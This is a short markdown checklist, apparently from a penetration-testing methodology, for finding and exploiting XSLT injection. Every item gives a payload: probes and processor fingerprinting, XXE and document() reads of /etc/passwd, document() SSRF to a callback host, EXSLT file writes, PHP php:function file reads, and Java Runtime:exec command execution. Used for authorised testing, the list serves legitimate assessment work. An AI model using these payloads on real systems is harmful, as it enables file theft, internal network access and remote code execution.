...
- [ ] Identify XSLT processing sinks: parameters named `xslt`, `stylesheet`, `transform`, `template`, SOAP services, report generators, XML-to-HTML converters
- [ ] Test probe reflection: inject `<xsl:value-of select="'XSLT_PROBE_OK'"/>` and check if output changes
- [ ] Fingerprint the XSLT processor via `system-property('xsl:vendor')`, `system-property('xsl:version')`, `system-property('xsl:vendor-url')`
- [ ] Test XXE via XSLT: inject DTD entity in stylesheet pointing to `file:///etc/passwd` or a callback URL
- [ ] Test `document()` function for file read: `document('/etc/passwd')`, `document('file:///c:/windows/win.ini')`
- [ ] Test `document()` for SSRF: `document('http://callback-host/ssrf')` with out-of-band listener
- [ ] Test EXSLT `exslt:document` write primitive: attempt to write a marker file to a known path
- [ ] Test PHP `php:function` RCE surface: `php:function('readfile','index.php')`, `php:function('scandir','.')`
- [ ] Test Java extension functions (Xalan/Saxon): `Runtime:exec(Runtime:getRuntime(), 'id')` via namespace binding
